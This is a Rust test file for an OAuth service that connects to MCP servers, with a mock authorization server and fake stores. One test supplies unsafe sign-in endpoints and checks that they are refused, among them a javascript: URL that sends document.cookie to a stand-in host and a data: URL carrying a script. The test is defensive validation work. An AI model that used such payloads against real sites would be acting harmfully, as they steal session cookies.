use super::*;
use crate::domain::models::UnsafeAuthorizationUrl;
use axum::{
    Json, Router,
    extract::State,
    http::{HeaderMap, HeaderValue, StatusCode, header::WWW_AUTHENTICATE},
    routing::{get, post},
};
use std::{
    collections::HashMap,
    sync::{
        Arc, Mutex,
        atomic::{AtomicUsize, Ordering},
    },
};

const CLIENT_METADATA_URL: &str =
    "https://document-cognition.macro.com/mcp/servers/auth/client-metadata";
const REDIRECT_URI: &str = "https://document-cognition.macro.com/mcp/servers/auth/callback";

#[derive(Clone, Default)]
struct FakeServerStore;

impl McpServerStore for FakeServerStore {
    type Err = anyhow::Error;

    async fn save(&self, _record: &McpServerRecord) -> Result<(), Self::Err> {
        Ok(())
    }

    async fn load(
        &self,
        _user_id: &MacroUserIdStr<'static>,
        _server_url: &str,
    ) -> Result<Option<McpServerRecord>, Self::Err> {
        Ok(None)
    }

    async fn delete(
        &self,
        _user_id: &MacroUserIdStr<'static>,
        _server_url: &str,
    ) -> Result<(), Self::Err> {
        Ok(())
    }

    async fn list(
        &self,
        _user_id: &MacroUserIdStr<'static>,
    ) -> Result<Vec<McpServerRecord>, Self::Err> {
        Ok(Vec::new())
    }
}

#[derive(Clone, Default)]
struct FakeStateStore {
    pending: Arc<Mutex<HashMap<String, PendingAuth>>>,
}

impl OAuthStateStore for FakeStateStore {
    async fn save(&self, csrf_token: &str, pending: PendingAuth) -> anyhow::Result<()> {
        self.pending
            .lock()
            .expect("state mutex is not poisoned")
            .insert(csrf_token.to_string(), pending);
        Ok(())
    }

    async fn take(&self, csrf_token: &str) -> anyhow::Result<Option<PendingAuth>> {
        Ok(self
            .pending
            .lock()
            .expect("state mutex is not poisoned")
            .remove(csrf_token))
    }
}

#[derive(Clone)]
struct MockAuthorizationServer {
    base_url: String,
    supports_client_metadata: bool,
    registrations: Arc<AtomicUsize>,
    /// The sign-in page the metadata advertises, when not `{base_url}/authorize`.
    authorization_endpoint: Option<String>,
}

async fn protected_resource(
    State(state): State<MockAuthorizationServer>,
) -> (StatusCode, HeaderMap) {
    let mut headers = HeaderMap::new();
    headers.insert(
        WWW_AUTHENTICATE,
        HeaderValue::from_str(&format!(
            "Bearer resource_metadata=\"{}/.well-known/oauth-protected-resource/mcp\"",
            state.base_url
        ))
        .expect("valid challenge"),
    );
    (StatusCode::UNAUTHORIZED, headers)
}

async fn protected_resource_metadata(
    State(state): State<MockAuthorizationServer>,
) -> Json<serde_json::Value> {
    Json(serde_json::json!({
        "resource": format!("{}/mcp", state.base_url),
        "authorization_servers": [state.base_url],
        "scopes_supported": ["read"],
    }))
}

async fn authorization_server_metadata(
    State(state): State<MockAuthorizationServer>,
) -> Json<serde_json::Value> {
    Json(serde_json::json!({
        "issuer": state.base_url,
        "authorization_endpoint": state
            .authorization_endpoint
            .clone()
            .unwrap_or_else(|| format!("{}/authorize", state.base_url)),
        "token_endpoint": format!("{}/token", state.base_url),
        "registration_endpoint": format!("{}/register", state.base_url),
        "response_types_supported": ["code"],
        "code_challenge_methods_supported": ["S256"],
        "client_id_metadata_document_supported": state.supports_client_metadata,
    }))
}

async fn register_client(
    State(state): State<MockAuthorizationServer>,
) -> (StatusCode, Json<serde_json::Value>) {
    state.registrations.fetch_add(1, Ordering::SeqCst);
    (
        StatusCode::CREATED,
        Json(serde_json::json!({
            "client_id": "dcr-client-id",
            "client_name": "Macro",
            "redirect_uris": [REDIRECT_URI],
            "grant_types": ["authorization_code", "refresh_token"],
            "response_types": ["code"],
            "token_endpoint_auth_method": "none",
        })),
    )
}

async fn spawn_authorization_server(
    supports_client_metadata: bool,
) -> (String, Arc<AtomicUsize>, tokio::task::JoinHandle<()>) {
    spawn_authorization_server_with_endpoint(supports_client_metadata, None).await
}

async fn spawn_authorization_server_with_endpoint(
    supports_client_metadata: bool,
    authorization_endpoint: Option<String>,
) -> (String, Arc<AtomicUsize>, tokio::task::JoinHandle<()>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind mock authorization server");
    let base_url = format!(
        "http://{}",
        listener.local_addr().expect("mock server address")
    );
    let registrations = Arc::new(AtomicUsize::new(0));
    let state = MockAuthorizationServer {
        base_url: base_url.clone(),
        supports_client_metadata,
        registrations: registrations.clone(),
        authorization_endpoint,
    };
    let app = Router::new()
        .route("/mcp", get(protected_resource))
        .route(
            "/.well-known/oauth-protected-resource/mcp",
            get(protected_resource_metadata),
        )
        .route(
            "/.well-known/oauth-authorization-server",
            get(authorization_server_metadata),
        )
        .route("/register", post(register_client))
        .with_state(state);
    let task = tokio::spawn(async move {
        axum::serve(listener, app)
            .await
            .expect("mock authorization server runs");
    });

    (base_url, registrations, task)
}

fn oauth_service() -> OAuthService<FakeServerStore, FakeStateStore> {
    oauth_service_with_state(FakeStateStore::default())
}

fn oauth_service_with_state(
    state_store: FakeStateStore,
) -> OAuthService<FakeServerStore, FakeStateStore> {
    OAuthService::new(
        FakeServerStore,
        state_store,
        OAuthClientMetadata::new(CLIENT_METADATA_URL.to_string(), REDIRECT_URI.to_string()),
        McpHttp::new(crate::outbound::guarded_http::AddressPolicy::AnyAddress).unwrap(),
        PreRegisteredProviders::empty(),
    )
}

fn test_user_id() -> MacroUserIdStr<'static> {
    MacroUserIdStr::parse_from_str("macro|test@example.com")
        .expect("valid test user id")
        .into_owned()
}

fn query_parameter(url: &str, key: &str) -> Option<String> {
    reqwest::Url::parse(url)
        .expect("valid authorization URL")
        .query_pairs()
        .find(|(candidate, _)| candidate == key)
        .map(|(_, value)| value.into_owned())
}

#[tokio::test]
async fn cimd_capability_uses_metadata_url_without_dynamic_registration() {
    let (base_url, registrations, server_task) = spawn_authorization_server(true).await;
    let server_url = format!("{base_url}/mcp");

    let authorization_url = oauth_service()
        .start_authorization(&test_user_id(), &server_url, "Test server")
        .await
        .expect("CIMD authorization starts");

    assert_eq!(
        query_parameter(&authorization_url, "client_id").as_deref(),
        Some(CLIENT_METADATA_URL)
    );
    assert_eq!(
        query_parameter(&authorization_url, "redirect_uri").as_deref(),
        Some(REDIRECT_URI)
    );
    assert_eq!(registrations.load(Ordering::SeqCst), 0);
    server_task.abort();
}

#[tokio::test]
async fn dcr_remains_the_fallback_when_cimd_is_not_supported() {
    let (base_url, registrations, server_task) = spawn_authorization_server(false).await;
    let server_url = format!("{base_url}/mcp");

    let authorization_url = oauth_service()
        .start_authorization(&test_user_id(), &server_url, "Test server")
        .await
        .expect("DCR authorization starts");

    assert_eq!(
        query_parameter(&authorization_url, "client_id").as_deref(),
        Some("dcr-client-id")
    );
    assert_eq!(registrations.load(Ordering::SeqCst), 1);
    server_task.abort();
}

#[tokio::test]
async fn a_script_sign_in_page_is_refused_before_any_state_is_saved() {
    for endpoint in [
        "javascript:fetch('//x/'+document.cookie)//",
        "data:text/html,<script>alert(1)</script>",
        "http://auth.example.com/authorize",
    ] {
        let (base_url, _, server_task) =
            spawn_authorization_server_with_endpoint(true, Some(endpoint.to_owned())).await;
        let state_store = FakeStateStore::default();

        let error = oauth_service_with_state(state_store.clone())
            .start_authorization(&test_user_id(), &format!("{base_url}/mcp"), "Test server")
            .await
            .expect_err("an unsafe sign-in page is refused");

        assert!(
            error.downcast_ref::<UnsafeAuthorizationUrl>().is_some(),
            "{endpoint}: {error:#}"
        );
        assert!(
            state_store
                .pending
                .lock()
                .expect("state mutex is not poisoned")
                .is_empty(),
            "{endpoint}: no pending state"
        );
        server_task.abort();
    }
}

#[tokio::test]
async fn an_https_sign_in_page_on_another_host_starts() {
    let (base_url, _, server_task) = spawn_authorization_server_with_endpoint(
        true,
        Some("https://auth.example.com/authorize".to_owned()),
    )
    .await;

    let authorization_url = oauth_service()
        .start_authorization(&test_user_id(), &format!("{base_url}/mcp"), "Test server")
        .await
        .expect("an https sign-in page starts");

    assert!(authorization_url.starts_with("https://auth.example.com/authorize?"));
    server_task.abort();
}
